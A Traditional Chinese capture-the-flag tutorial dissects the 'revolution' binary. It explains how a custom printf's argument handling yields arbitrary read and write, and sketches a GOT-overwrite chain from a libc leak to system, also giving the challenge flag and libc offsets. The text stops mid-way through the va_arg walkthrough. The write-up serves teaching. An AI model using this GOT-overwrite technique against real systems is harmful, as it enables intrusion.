# Sunshine CTF — `revolution` 完全新手教學筆記（繁體中文）

> 這份筆記假設你**完全沒聽過** PWN、ROP、格式化字串漏洞，只會一點點 C 語言。
> 每一個用到的組合語言指令都會引用 `objdump -d -M intel` 的原始輸出並逐行解釋。
> 所有位址都是**實際驗證過**的（`readelf` / `objdump` / `gdb`），不是猜的。

---

## 0. 先看結論（懶人包）

| 項目 | 內容 |
|---|---|
| 漏洞型態 | 自製（非 glibc）printf 的「可變參數」讀取區被初始化成 **main 的輸入緩衝區** |
| 拿到的能力 | `%N$s` = 任意位址讀字串、`%N$w` = 任意位址寫 8 bytes（值可含 `\x00`） |
| 利用鏈 | 洩漏 `setvbuf@got` → 算 libc base → 把 `strcspn@got` 覆寫成 `system` → 下一行輸入被當成 shell 指令 |
| 真實 flag | `sun{cust0m_fmtstr_n0_t00ls_4ll0wed}` |
| 遠端 libc | Ubuntu 24.04 的 `libc6 2.39-0ubuntu8(.1/.2/.3)`，`system = base + 0x58740` |

---

## 1. 題目資訊

```
$ file revolution
revolution: ELF 64-bit LSB executable, x86-64, dynamically linked,
            interpreter /lib64/ld-linux-x86-64.so.2, stripped
$ sha256sum revolution
918483831ef0b27d0cfb8afa9e0341f38d0a296931ccc5f73ef80f5d610f8fa5
$ ./revolution
=== PRINT PRINT REVOLUTION ===
Enter your score card template:
score> AAAA
AAAA
score> ^C
```

執行後它一直跟你要一行「score card template」，然後把那一行印回來，
但支援一些奇怪的格式：`%1$p`、`%14$s`、`%14$w`……這些**不是** glibc 的 printf 語法，
而是程式自己寫的一台小「格式化虛擬機」。

### 1.1 保護機制（checksec）與白話解釋

| 保護 | 這題的狀態 | 白話解釋 |
|---|---|---|
| **PIE（Position Independent Executable）** | **關閉**（`Type: EXEC`，載入位址固定 `0x400000`） | 程式碼/資料的位址每次執行都一樣。好處：我們可以直接寫死 `0x404010` 這種位址。 |
| **ASLR（Address Space Layout Randomization）** | 系統層級**開啟**（libc 每次載入位址都不同） | `libc`、`stack`、`ld.so` 的位址每次執行隨機。所以「程式內位址固定、libc 位址要洩漏」是這題的核心。 |
| **NX（No-eXecute，`GNU_STACK RW`）** | **開啟** | 堆疊/資料區不可執行 → 不能把 shellcode 放堆疊然後跳過去執行。 |
| **RELRO（GNU_RELRO `0x403dc0` + `0x240` = 到 `0x404000`）** | **Partial** | 只有 `.init_array/.fini_array/.dynamic/.got`（`0x403dc0`–`0x404000`）被設成唯讀；**`.got.plt`（`0x404000` 之後）仍然可寫** → 可以改 GOT。 |
| **Canary（`-fstack-protector`）** | **沒有**（`readelf -s` 找不到 `__stack_chk_fail`） | 堆疊溢位不會被偵測；不過這題也用不到堆疊溢位。 |
| **CET / IBT（`endbr64`）** | 有編進指令但硬體沒強制 | `endbr64` 只是 CET 的合法跳躍點標記，不影響我們。 |

指令驗證：

```bash
$ readelf -lW revolution | grep -E "GNU_RELRO|GNU_STACK"
  GNU_STACK  ... RW  0x10          # NX on
  GNU_RELRO  0x002dc0 0x403dc0 0x403dc0 0x000240 0x000240 R 0x1
$ readelf -h revolution | grep Type
  Type:  EXEC (Executable file)    # non-PIE
```

### 1.2 相關檔案

| 位址 | 內容 |
|---|---|
| `0x4010d0` | `main()`（被 strip 掉名字，就是 `_start` 傳給 `__libc_start_main` 的那個函式，見 `0x4011e8: mov rdi,0x4010d0`） |
| `0x401330` | 自製 `printf(fmt, ...)` |
| `0x4012c0` | 自製 `va_arg`：`get_arg(va_list *ap, int n)` |
| `0x401190` | 初始化：對 stdout/stderr 呼叫 `setvbuf(...,_IONBF)`（它是 `.init_array[1]`，在 `main` 之前執行） |

`_IONBF = 2` 是「**不緩衝**」（`_IO_UNBUFFERED`）：每次 `write()` 都立刻送到 socket／終端機。
所以我們用 `recvuntil(b'score> ')` 收輸出時，不會有「資料卡在 libc 緩衝區裡還沒送出來」的問題
（pwn2 §2.4 也靠同一招）。這也是為什麼 `exploit.py` 可以直接一行一行地問答，不必手動 flush。

---

## 2. x86-64 速成班（看不懂組語的人先看這節）

### 2.1 暫存器

| 64-bit | 32-bit | 用途 / 誰負責保存 |
|---|---|---|
| `rax` | `eax` | 函式**回傳值**；也被拿來暫存運算結果 |
| `rbx` | `ebx` | 一般用途。**callee-saved**：被呼叫的函式要自己還原 |
| `rcx` | `ecx` | 第 4 個參數；也常當迴圈計數器、移位量（`shr rsi, cl`） |
| `rdx` | `edx` | 第 3 個參數 |
| `rsi` | `esi` | 第 2 個參數 |
| `rdi` | `edi` | 第 1 個參數 |
| `rbp` | `ebp` | 傳統「框架指標」（frame pointer） |
| `rsp` | `esp` | **堆疊指標**，永遠指向堆疊最頂端（低位址） |
| `r8`–`r15` | `r8d`–`r15d` | 第 5、6 個參數（`r8`,`r9`）與一般用途；`r12`–`r15` 是 callee-saved |

### 2.2 System V AMD64 呼叫慣例（Linux 的規定）

* 整數/指標參數依序放：`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`，第 7 個之後**推上堆疊**。
* 浮點參數放 `xmm0`–`xmm7`。
* 回傳值放 `rax`（浮點在 `xmm0`）。
* `rax`、`rcx`、`rdx`、`rsi`、`rdi`、`r8`–`r11` 是 **caller-saved**（呼叫別人的函式後可能被改爛）。
* `rbx`、`rbp`、`r12`–`r15`、`rsp` 是 **callee-saved**（被呼叫者必須原值還原）。
* **`call` 會把下一道指令的位址（返回位址）推入堆疊；`ret` 會把它彈回 `rip`。**

這題的 `0x4012c0` 就是在**手工模擬**「參數在哪裡」這件事 —— 這是理解本題漏洞的關鍵。

### 2.3 堆疊框架（stack frame）

```
        高位址
        ┌──────────────────────────┐
        │ 呼叫者的資料             │
        ├──────────────────────────┤
        │ 返回位址 (call 推入的)   │ ← 進入函式時 rsp 指這裡
        ├──────────────────────────┤
        │ 被呼叫者 push 的舊 rbp...│
        ├──────────────────────────┤
        │ 被呼叫者的區域變數       │ ← sub rsp, N 之後 rsp 指這裡
        └──────────────────────────┘
        低位址
```

`push rax` 等於「`rsp -= 8; [rsp] = rax`」，`pop rax` 等於「`rax = [rsp]; rsp += 8`」。

### 2.4 本題用到的指令速查

| 指令 | 意思 |
|---|---|
| `mov dst, src` | 複製（`mov rbx, rsp` = 把 rsp 的值複製到 rbx） |
| `movzx eax, BYTE PTR [rdi]` | 讀 1 byte 並**零擴展**成 32 bit（高位補 0，用於無號） |
| `movsx eax, al` / `movsxd rax, eax` | **符號擴展**（高位補 sign bit，用於有號） |
| `lea dst, [base+index*scale+disp]` | 算**位址**（不是讀記憶體！）`lea rsi,[rip+0xf46]` = 取一段位址 |
| `add/sub dst, imm` | 加/減 |
| `cmp a, b` | 做 `a - b` 但只設定旗標（不存結果） |
| `test a, a` | 做 AND 只設旗標；`test rax,rax` 常用來判斷「是否為 0 / 正負」 |
| `jmp label` | 無條件跳躍 |
| `je/jne/jg/jle/ja/jbe label` | 條件跳躍（等於/不等於/大於/小於等於/無號大於/無號小於等於） |
| `call addr` / `ret` | 呼叫（推入返回位址）／返回（彈出返回位址） |
| `push` / `pop` | 推入／彈出堆疊 |
| `xor eax, eax` | 把 eax 清零（比 `mov eax,0` 短）；`xor` 只在旗標上做 XOR 運算 |
| `and esi, 0xf` | 位元 AND（取低位 nibble） |
| `shr rsi, cl` | 邏輯右移，移位量放在 `cl`（rcx 的低 8 位） |
| `endbr64` / `nop` / `xchg ax,ax` | 空操作／CET 標記，不影響邏輯 |

### 2.5 PLT / GOT 與延遲綁定（lazy binding）

程式呼叫 libc 函式時，不會直接跳到 libc，而是先跳到一個小跳板：

```
0000000000401080 <write@plt>:            ← 程式碼裡 call 0x401080
  401080: endbr64
  401084: jmp QWORD PTR [rip+0x2f76]     # 404000  ← 讀 GOT 裡的值跳過去
```

* **GOT（Global Offset Table）**：一張「函式真實位址」的表格，位於可寫資料段。
* **第一次呼叫前**，`[0x404000]` 的值指向 `.plt` 裡的延遲解析 stub：

```
0000000000401030 <write@plt 的延遲解析 stub>:
  401034: push 0x0        ← 推入 relocation 索引（write 是第 0 個）
  401039: jmp  0x401020   ← 跳到 PLT0
0000000000401020 <.plt>:
  401020: push QWORD PTR [rip+0x2fca]  # 403ff0  ← link_map
  401026: jmp  QWORD PTR [rip+0x2fcc]  # 403ff8  ← _dl_runtime_resolve（動態連結器）
```

動態連結器解析完後會**把真正的位址寫回 GOT**，之後呼叫就直接跳 libc。

本題 `.rela.plt`（`readelf -r revolution`）決定索引順序：

```
0x404000  R_X86_64_JUMP_SLOT  write        (索引 0)
0x404008  R_X86_64_JUMP_SLOT  strlen       (索引 1)
0x404010  R_X86_64_JUMP_SLOT  strcspn      (索引 2)
0x404018  R_X86_64_JUMP_SLOT  read         (索引 3)
0x404020  R_X86_64_JUMP_SLOT  setvbuf      (索引 4)
```

**什麼是 IFUNC（indirect function）？**

有些 libc 函式（`strlen`、`strcspn`、`memcpy`…）在載入時會執行一小段「選擇器」程式碼，
依 CPU 支援的指令集挑出最快的實作（例如 `__strcspn_avx2`）。
所以**動態連結器寫進 GOT 的是「被挑中的那個實作」的位址，不是 `readelf -s` 上看到的符號值**
（符號值是選擇器本身）。實測（本機）：

```
strcspn@got - libc_base = 0x1935c0     ← 實際被挑中的實作
readelf -s libc | grep strcspn  →  0xaf070   ← 選擇器（兩者不同！）
```

這就是為什麼：
* 拿 `strcspn@got` 當 libc 指紋會誤判（§11-4）；
* 洩漏來源要挑 `setvbuf` / `read` / `write` / `stdout` 這些**非** IFUNC 的符號。

> **重要**：`setvbuf` 在 `main` 之前就被 `0x401190` 呼叫過，所以它的 GOT **一定有真實 libc 位址** →
> 我們的第一個資訊洩漏就挑它。而 `strlen`/`strcspn` 是 **IFUNC**（見 §11 常見坑 4），
> GOT 裡存的是「被挑選的實作版本」，不是符號本身的 offset，這點等等會咬人。

---

## 3. `main` 逐行解說（`0x4010d0`）

```asm
00000000004010d0 <main>:                     ; 由 __libc_start_main 呼叫 (rdi = 0x4010d0)
  4010d0: f3 0f 1e fa        endbr64        ; CET 合法進入點標記，無邏輯作用
  4010d4: 41 54              push r12        ; rsp -= 8; [rsp] = r12 (保存呼叫者的 r12)
  4010d6: ba 1f 00 00 00     mov  edx,0x1f   ; edx = 31  → write 的第 3 個參數「長度」
  4010db: 48 8d 35 46 0f 00 00  lea rsi,[rip+0xf46]   ; rsi = 0x402028 ("=== PRINT PRINT REVOLUTION ===\n")
  4010e2: bf 01 00 00 00     mov  edi,0x1    ; edi = 1   → fd = stdout
  4010e7: 55                 push rbp        ; 保存 rbp
  4010e8: 4c 8d 25 2b 0c 00 00  lea r12,[rip+0xf2b]   ; r12 = 0x40201a ("score> ")
  4010ef: 48 8d 2d 2c 0c 00 00  lea rbp,[rip+0xf2c]   ; rbp = 0x402022 ("\n")
  4010f6: 53                 push rbx        ; 保存 rbx
  4010f7: 48 81 ec 00 02 00 00  sub rsp,0x200  ; ★ 開一個 0x200 bytes 的區域緩衝區
  4010fe: e8 7d ff ff ff     call 0x401080   ; write(1, "=== PRINT...", 31)  → 印標題
  401103: ba 20 00 00 00     mov  edx,0x20   ; 32
  401108: bf 01 00 00 00     mov  edi,0x1
  40110d: 48 89 e3           mov  rbx,rsp    ; ★★ rbx = rsp = 緩衝區起始位址（以下叫 buf）
  401110: 48 8d 35 31 0c 00 00  lea rsi,[rip+0xf31]  ; rsi = 0x402048 ("Enter your score card template:\n")
  401117: e8 64 ff ff ff     call 0x401080   ; write(1, "...template:\n", 32)
  40111c: eb 31              jmp  0x40114f   ; 直接跳進迴圈「印提示」

--- 迴圈頂端 ---
  40114f: ba 07 00 00 00     mov  edx,0x7    ; 7
  401154: 4c 89 e6           mov  rsi,r12    ; "score> "
  401157: bf 01 00 00 00     mov  edi,0x1
  40115c: e8 1f ff ff ff     call 0x401080   ; write(1, "score> ", 7)
  401161: 31 ff              xor  edi,edi    ; edi = 0  → fd = stdin
  401163: ba ff 01 00 00     mov  edx,0x1ff  ; ★ 最多讀 511 bytes（緩衝區 512 bytes）
  401168: 48 89 de           mov  rsi,rbx    ; buf
  40116b: e8 40 ff ff ff     call 0x4010b0   ; read(0, buf, 0x1ff)   → rax = 讀到幾個 byte
  401170: 48 85 c0           test rax,rax    ; rax 是否 <= 0（EOF / 錯誤）？
  401173: 7f ab              jg   0x401120   ; rax > 0 才繼續處理
  401175: 48 81 c4 00 02 00 00  add rsp,0x200  ; 收工：還原堆疊
  40117c: 31 c0              xor  eax,eax    ; return 0
  40117e: 5b                 pop  rbx
  40117f: 5d                 pop  rbp
  401180: 41 5c              pop  r12
  401182: c3                 ret             ; 回到 __libc_start_call_main

--- 處理剛讀到的那一行（0x401120）---
  401120: 48 89 ee           mov  rsi,rbp    ; rsi = "\n"
  401123: 48 89 df           mov  rdi,rbx    ; rdi = buf
  401126: c6 04 04 00        mov  BYTE PTR [rsp+rax*1],0x0   ; ★ buf[讀到的長度] = 0（補字串結尾）
  40112a: e8 71 ff ff ff     call 0x4010a0   ; strcspn(buf, "\n") → rax = 換行前的長度
  40112f: 48 89 df           mov  rdi,rbx    ; rdi = buf（printf 的第 1 個參數）
  401132: c6 04 04 00        mov  BYTE PTR [rsp+rax*1],0x0   ; buf[rax] = 0 → 把換行換成 '\0'
  401136: 31 c0              xor  eax,eax    ; al = 0 → printf 的「有幾個 xmm 參數」
  401138: e8 f3 01 00 00     call 0x401330   ; ★★ 自製 printf(buf)
  40113d: ba 01 00 00 00     mov  edx,0x1
  401142: 48 89 ee           mov  rsi,rbp
  401145: bf 01 00 00 00     mov  edi,0x1
  40114a: e8 31 ff ff ff     call 0x401080   ; write(1, "\n", 1)
  40114f: (fallthrough 回 0x40114f —— 迴圈頂端；0x40114a 的 call 是 5 bytes，0x40114a+5 = 0x40114f)
```

**重點整理**

1. `buf` 就是 `rsp`（`mov rbx,rsp`），大小 512，最多讀 511 bytes →
   `read` **沒有**溢位，**打不到返回位址**（網路上很多這題的猜測在這裡就錯了）。
2. 讀完後 `buf[strlen] = 0`、`buf[strcspn(buf,"\n")] = 0`，把輸入變成 C 字串。
3. 然後把我們輸入的字串當成**格式字串**交給 `0x401330`。

---

## 4. 自製 `printf` 逐行解說（`0x401330`）

### 4.1 入口：建立 `va_list`（可變參數清單）

```asm
  401330: 41 57              push r15
  401332: 49 89 ff           mov  r15,rdi        ; r15 = fmt（格式字串指標）
  401335: 41 56              push r14
  401337: 41 55              push r13
  401339: 41 54              push r12
  40133b: 55                 push rbp
  40133c: 53                 push rbx            ; 共 push 6 個 = 0x30 bytes
  40133d: 48 81 ec e8 00 00 00  sub rsp,0xe8     ; 區域空間 0xe8
  401344: 48 89 74 24 38     mov  [rsp+0x38],rsi ; ★ 把「第 1 個可變參數暫存器」存到堆疊
  401349: 48 89 54 24 40     mov  [rsp+0x40],rdx ; 第 2 個
  40134e: 48 89 4c 24 48     mov  [rsp+0x48],rcx ; 第 3 個
  401353: 4c 89 44 24 50     mov  [rsp+0x50],r8  ; 第 4 個
  401358: 4c 89 4c 24 58     mov  [rsp+0x58],r9  ; 第 5 個
  40135d: 84 c0              test al,al          ; al = 0（main 有 xor eax,eax）→ 不存 xmm
  40135f: 74 3a              je   0x40139b
  ... (若 al != 0 會用 movaps 把 xmm0-xmm7 存到 [rsp+0x60]..[rsp+0xd0])
```

接著建立 `va_list` 結構（SysV ABI 的 `va_list` 是 24 bytes）：

```asm
  40139b: 31 db              xor  ebx,ebx        ; ebx = 0（「沒有寫索引」時的流水號計數器）
  40139d: 4c 8d 25 62 0c 00 00  lea r12,[rip+0xc62]  ; r12 = 0x402006 ("ok")
  4013a4: 4c 8d 35 5e 0c 00 00  lea r14,[rip+0xc5e]  ; r14 = 0x402009 ("0123456789abcdef")
  4013ab: c7 44 24 18 08 00 00 00  mov DWORD [rsp+0x18],0x8   ; va_list.gp_offset   = 8
  4013b3: 48 8d 84 24 20 01 00 00  lea rax,[rsp+0x120]
  4013bb: c7 44 24 1c 30 00 00 00  mov DWORD [rsp+0x1c],0x30  ; va_list.fp_offset   = 0x30
  4013c3: 48 8d 2d 3a 0c 00 00  lea rbp,[rip+0xc3a]  ; rbp = 0x402004 ("%")
  4013ca: 48 89 44 24 20     mov  [rsp+0x20],rax  ; va_list.overflow_arg_area = rsp+0x120  ★★★
  4013cf: 48 8d 44 24 30     lea  rax,[rsp+0x30]
  4013d4: 48 89 44 24 28     mov  [rsp+0x28],rax  ; va_list.reg_save_area     = rsp+0x30
  4013d9: 41 0f b6 07        movzx eax,BYTE PTR [r15]   ; eax = *fmt
  4013dd: 84 c0              test al,al
  4013df: 0f 84 ac 00 00 00  je   0x401491        ; 字串結尾 → 收工
```

`va_list` 的意義：

| 偏移 | 欄位 | 值（本題） | 意義 |
|---|---|---|---|
| `+0x18` | `gp_offset` | `8` | 下一個整數參數要從 `reg_save_area+8` 拿（跳過 `+0` 的洞） |
| `+0x1c` | `fp_offset` | `0x30` | 浮點參數的位置（本題用不到） |
| `+0x20` | `overflow_arg_area` | `rsp+0x120` | 暫存器用完後，參數改從這裡往高位址拿 |
| `+0x28` | `reg_save_area` | `rsp+0x30` | 前面存的 rsi/rdx/rcx/r8/r9 所在位置 |

**★ 這是整個題目的核心**：`rsp+0x120` 到底在哪？用 gdb 實測：

```bash
$ cd /home/kzzz/Documents/code/ctf/sunshine/pwn3
$ printf '%%6$p\n' > /tmp/rev_in      # ★ 先寫成檔案：不能用 <(...)，因為 gdb 開的子 shell 可能是 dash
$ gdb -q -batch -ex 'file ./revolution' -ex 'break *0x4013d9' -ex 'run < /tmp/rev_in' \
      -ex 'p/x $rsp' -ex 'p/x $rsp+0x120' -ex 'info registers rdi r15' \
      -ex 'x/1gx $rsp+0xe8' -ex 'x/1gx $rsp+0x120'
Breakpoint 1, 0x00000000004013d9 in ?? ()
$1 = 0x7fffffffdac0                        # printf 內部的 rsp  → = buf-0x120
$2 = 0x7fffffffdbe0                        # ← rsp+0x120 = va_list.overflow_arg_area = buf
rdi            0x7fffffffdbe0              # ← 格式字串指標，也等於 buf
r15            0x7fffffffdbe0              # ← printf 自己抄了一份（mov r15,rdi）
0x7fffffffdba8:	0x00007fffffffdbe0         # ← [rsp+0xe8] = buf-0x38 = 保存的 rbx = buf  ★
0x7fffffffdbe0:	0x0000000070243625         # ← [rsp+0x120] = [buf] 的前 8 bytes = "%6$p\0\0\0\0"
```

上面那條 gdb 指令一次就驗證了四件事：

| `-ex` 參數 | 證明什麼 |
|---|---|
| `break *0x4013d9` | 停在 `printf` 剛把 `va_list` 建好、準備讀第一個字元的位置 |
| `p/x $rsp` + `p/x $rsp+0x120` | `overflow_arg_area` 的值就是 `rsp+0x120`（見 §4.1 的 `mov [rsp+0x20],rax`） |
| `info registers rdi r15` | `rdi` = 傳進來的格式字串指標、`r15 = rdi` → 兩個都等於 `buf` |
| `x/1gx $rsp+0xe8` | `[rsp+0xe8]` = `buf-0x38` = `printf` 保存的 `rbx` = `buf`（見 §7.2 的表格） |
| `x/1gx $rsp+0x120` | `[rsp+0x120]` = `[buf]` = 我們輸入的前 8 bytes（`"%6$p\0\0\0\0"`） |

→ `rsp+0x120 == r15 == rdi == buf`，**這就證明了「第 6 個之後的可變參數 = 我們的輸入」**。

> ⚠️ 三個新手常踩的雷：
> 1. `-ex '...'`（把省略號當指令貼）會噴 `No symbol "..."`，一定要填真的指令。
> 2. `run < <(printf ...)` 需要 bash 的 process substitution，但 **gdb 是用 `/bin/sh` 開子 shell**；
>    Ubuntu/Debian 的 `/bin/sh` 是 dash → `sh: 1: Syntax error: "(" unexpected`。
>    **先用 `printf ... > /tmp/rev_in` 寫檔再 `run < /tmp/rev_in`** 就完全可攜。
> 3. 最後那行 `x/1gx $rsp+0xe8` 是**證明「保存的 rbx == buf」的唯一直接證據**（見 §7.2 的堆疊圖）。

為什麼會一樣？因為：

```
main:  call 0x401330                 → 推入返回位址，rsp = buf - 8
printf: push ×6 (0x30) + sub rsp,0xe8 → rsp = buf - 8 - 0x30 - 0xe8 = buf - 0x120
        rsp + 0x120 == buf  ✔
```

也就是說：**第 6 個（含）以後的「可變參數」直接從我們輸入的緩衝區開頭開始拿**：

```
第 N 個參數  ==  *(u64 *)(buf + 8*(N-6))
```

`main` 只傳了 `rdi = buf` 一個參數，其他「參數」其實就是我們的輸入內容。這是作者刻意的設計
（`%N$w` 這種「寫入」語法一看就是刻意留的後門），但它同時也是一個**沒有任何邊界檢查**的任意寫入原語。

### 4.2 主迴圈：解析格式字串

```asm
  4013e8: 3c 25              cmp  al,0x25       ; 是 '%' 嗎？
  4013ea: 0f 85 b8 00 00 00  jne  0x4014a8       ; 不是 → 逐字元印出（見 4.6）
  4013f0: 41 0f b6 47 01     movzx eax,BYTE PTR [r15+1]  ; 看 '%' 後面那個字元
  4013f5: 4d 8d 6f 01        lea  r13,[r15+1]            ; r13 = 指向 '%' 後面那個字元
  4013f9: 3c 25              cmp  al,0x25
  4013fb: 0f 84 07 01 00 00  je   0x401508       ; "%%" → 印一個 '%'
  401401: 84 c0              test al,al
  401403: 0f 84 88 00 00 00  je   0x401491       ; "%\0" → 結束
  401409: 8d 50 d0           lea  edx,[rax-0x30]  ; edx = 字元 - '0'
  40140c: 80 fa 09           cmp  dl,0x9
  40140f: 0f 87 ab 00 00 00  ja   0x4014c0       ; 不是數字 → 走「流水號模式」
```

### 4.3 解析 `%<數字>$`（指定第幾個參數）

```asm
  401415: 31 f6              xor  esi,esi          ; esi = 累計值 = 0
  401420: 83 e8 30           sub  eax,0x30         ; eax = 數字字元 - '0'
  401423: 8d 14 b6           lea  edx,[rsi+rsi*4]  ; edx = 值 * 5
  401426: 4c 89 e9           mov  rcx,r13          ; rcx = 目前數字的位置
  401429: 49 83 c5 01        add  r13,0x1          ; r13++（指向下一個字元）
  40142d: 0f be c0           movsx eax,al          ; 符號擴展
  401430: 8d 34 50           lea  esi,[rax+rdx*2]  ; ★ esi = 數字 + 值*10（十進位累加，32-bit）
  401433: 41 0f b6 45 00     movzx eax,BYTE PTR [r13+0x0]  ; 讀下一個字元
  401438: 8d 50 d0           lea  edx,[rax-0x30]
  40143b: 80 fa 09           cmp  dl,0x9
  40143e: 76 e0              jbe  0x401420         ; 還是數字 → 繼續累加
  401440: 3c 24              cmp  al,0x24          ; 是 '$' 嗎？
  401442: 75 3c              jne  0x401480         ; 不是 → 這種寫法無效，跳過
  401444: 0f b6 41 02        movzx eax,BYTE PTR [rcx+0x2]  ; 取 '$' 後面那個字元（=格式字元）
  401448: 4c 8d 69 02        lea  r13,[rcx+0x2]
```

這裡就是 `atoi` 的手寫版，用的是 `值*10 + 數字`（`lea edx,[rsi+rsi*4]` 是 `*5`，
再 `lea esi,[rax+rdx*2]` 就是 `數字 + 值*10`）。

### 4.4 格式字元分派

```asm
  40144c: 3c 77              cmp  al,0x77        ; 'w' ?
  40144e: 74 7d              je   0x4014cd       ; → 寫入原語 %N$w
  401450: 0f 8f ca 00 00 00  jg   0x401520       ; 大於 'w' → 檢查 'x'
  401456: 3c 70              cmp  al,0x70       ; 'p' ?
  401458: 0f 84 e2 00 00 00  je   0x401540       ; → 16 進位輸出 %N$p
  40145e: 3c 73              cmp  al,0x73       ; 's' ?
  401460: 0f 85 be 00 00 00  jne  0x401524       ; 其他 → 原樣印出該字元
  ; --- %N$s：任意位址讀字串 ---
  401466: 48 8d 7c 24 18     lea  rdi,[rsp+0x18]   ; rdi = &va_list
  40146b: e8 50 fe ff ff     call 0x4012c0         ; rax = get_arg(va, N)
  401470: 49 89 c7           mov  r15,rax          ; r15 = 取到的指標
  401473: 48 85 c0           test rax,rax
  401476: 0f 85 21 01 00 00  jne  0x40159d        ; 非 NULL → 去印
  40147c: (NULL → 什麼都不印)

  40159d: 48 89 c7           mov  rdi,rax
  4015a0: e8 eb fa ff ff     call 0x401090         ; strlen(r15)
  4015a5: 4c 89 fe           mov  rsi,r15
  4015a8: bf 01 00 00 00     mov  edi,0x1
  4015ad: 48 89 c2           mov  rdx,rax           ; 長度 = strlen
  4015b0: e8 cb fa ff ff     call 0x401080         ; write(1, r15, strlen(r15))  ★ 任意讀！
```

```asm
  ; --- %N$p / %N$x：把「參數值」以 0x + 16 個 16 進位數字印出 ---
  401540: 48 8d 7c 24 18     lea  rdi,[rsp+0x18]
  401545: e8 76 fd ff ff     call 0x4012c0         ; rax = get_arg(va, N)
  40154a: 48 8d 54 24 02     lea  rdx,[rsp+0x2]    ; 輸出指標（從 rsp+2 開始）
  40154f: b9 3c 00 00 00     mov  ecx,0x3c         ; 先移 60 bits（最高 nibble）
  401554: 0f b7 3d 0f 0b 00 00  movzx edi,WORD PTR [rip+0xb0f]  ; 0x40206a = "0x"
  40155b: 66 89 3c 24        mov  WORD PTR [rsp],di          ; 把 "0x" 寫到堆疊暫存區
  40155f: 48 8d 7c 24 12     lea  rdi,[rsp+0x12]   ; 結束位址 = rsp+18
  401568: 48 89 c6           mov  rsi,rax
  40156b: 48 83 c2 01        add  rdx,0x1
  40156f: 48 d3 ee           shr  rsi,cl           ; 右移 cl bits
  401572: 83 e9 04           sub  ecx,0x4
  401575: 83 e6 0f           and  esi,0xf          ; 取最低 4 bits
  401578: 41 0f b6 34 36     movzx esi,BYTE PTR [r14+rsi*1]   ; 查表 "0123456789abcdef"
  40157d: 40 88 72 ff        mov  BYTE PTR [rdx-0x1],sil
  401581: 48 39 d7           cmp  rdi,rdx
  401584: 75 e2              jne  0x401568
  401586: 48 89 e6           mov  rsi,rsp
  401589: ba 12 00 00 00     mov  edx,0x12         ; 18 bytes = "0x" + 16 hex
  40158e: bf 01 00 00 00     mov  edi,0x1
  401593: e8 e8 fa ff ff     call 0x401080         ; write(1, rsp, 18)
```

> 注意這段是**寫在 `rsp`（printf 自己的堆疊框）的 18 bytes 暫存區**，不是 `.bss`，
> 也不是什麼會溢位的 `memcpy`（見 §11 常見坑 7）。

```asm
  ; --- %N$w：任意位址寫入 8 bytes ★★★ ---
  4014cd: 4c 8d 4c 24 18     lea  r9,[rsp+0x18]
  4014d2: 4c 89 cf           mov  rdi,r9
  4014d5: e8 e6 fd ff ff     call 0x4012c0         ; rax = get_arg(va, N)     → 「目的位址」
  4014da: 83 c6 01           add  esi,0x1          ; 參數編號 +1
  4014dd: 4c 89 cf           mov  rdi,r9
  4014e0: 49 89 c0           mov  r8,rax           ; r8 = 目的位址
  4014e3: e8 d8 fd ff ff     call 0x4012c0         ; rax = get_arg(va, N+1)   → 「要寫的值」
  4014e8: ba 02 00 00 00     mov  edx,0x2
  4014ed: 4c 89 e6           mov  rsi,r12          ; "ok"
  4014f0: bf 01 00 00 00     mov  edi,0x1
  4014f5: 49 89 00           mov  QWORD PTR [r8],rax   ; ★★ *(u64*)目的 = 值
  4014f8: e8 83 fb ff ff     call 0x401080         ; write(1, "ok", 2)
  4014fd: e9 7e ff ff ff     jmp  0x401480
```

也就是說：

```
%N$w   →   *(uint64_t *) arg[N] = arg[N+1];   write(1, "ok", 2);
```

**沒有任何檢查**：位址可以任意、值可以任意（包含 `\x00`）。

### 4.5 `%<數字>`（沒有 `$`）與流水號模式

```asm
  4014c0: 83 c3 01           add  ebx,0x1          ; ebx++（ebx 是流水號）
  4014c3: 89 de              mov  esi,ebx          ; 用 ebx 當參數編號
  4014c5: 3c 77              cmp  al,0x77
  4014c7: 0f 85 83 ff ff ff  jne  0x401450        ; 回到共用的格式字元分派
  401480: 41 0f b6 45 01     movzx eax,BYTE PTR [r13+1]  ; 下一個字元
  401485: 4d 8d 7d 01        lea  r15,[r13+1]
  401489: 84 c0              test al,al
  40148b: 0f 85 57 ff ff ff  jne  0x4013e8        ; 繼續主迴圈
  401491: 48 81 c4 e8 00 00 00  add rsp,0xe8    ; 收工
  401498: 5b                 pop  rbx
  401499: 5d                 pop  rbp
  40149a: 41 5c              pop  r12
  40149c: 41 5d              pop  r13
  40149e: 41 5e              pop  r14
  4014a0: 41 5f              pop  r15
  4014a2: c3                 ret
```

### 4.6 不是 `%` 的字元：一個一個寫出去

```asm
  4014a8: ba 01 00 00 00     mov  edx,0x1          ; 長度 1
  4014ad: 4c 89 fe           mov  rsi,r15          ; 指向那個字元
  4014b0: bf 01 00 00 00     mov  edi,0x1
  4014b5: 4d 89 fd           mov  r13,r15
  4014b8: e8 c3 fb ff ff     call 0x401080         ; write(1, r15, 1)
  4014bd: eb c1              jmp  0x401480
```

**這條路徑會掃到字串的 `\0` 為止** —— 這個特性等等拿來當「格式字串提前結束」的技巧。

### 4.7 格式語法總表

| 語法 | 行為 | 用途 |
|---|---|---|
| `%%` | 印出 `%` | — |
| `%N$s` | `write(1, arg[N], strlen(arg[N]))`；`arg[N]==NULL` 就什麼都不印 | **任意讀** |
| `%N$p` | 印出 `0x` + `arg[N]` 的 16 位 16 進位 | 洩漏「值」 |
| `%N$x` | 同 `%N$p` | 同 |
| `%N$w` | `*(u64*)arg[N] = arg[N+1]`，然後印 `ok` | **任意寫** |
| `%<數字>s`（沒有 `$`） | 無效，整個跳過 | — |
| `%s`（沒有數字） | 使用流水號 `ebx+1` 當索引 | 本題沒用到 |

---

## 5. 自製 `va_arg` 逐行解說（`0x4012c0`）

`get_arg(rdi = va_list*, esi = n)`：取第 n 個整數參數。

```asm
  4012c0: f3 0f 6f 07        movdqu xmm0,XMMWORD PTR [rdi]   ; 複製 va_list 前 16 bytes
  4012c4: 0f 11 44 24 e0     movups XMMWORD PTR [rsp-0x20],xmm0  ; 存到自己的暫存區
  4012c9: 48 8b 7f 10        mov    rdi,QWORD PTR [rdi+0x10] ; 複製第 3 個 8 bytes
  4012cd: 48 89 7c 24 f0     mov    QWORD PTR [rsp-0x10],rdi
  4012d2: 85 f6              test   esi,esi
  4012d4: 7e 4a              jle    0x401320        ; n <= 0 → 直接回傳 0
  4012d6: 31 c9              xor    ecx,ecx         ; 已取用個數 = 0
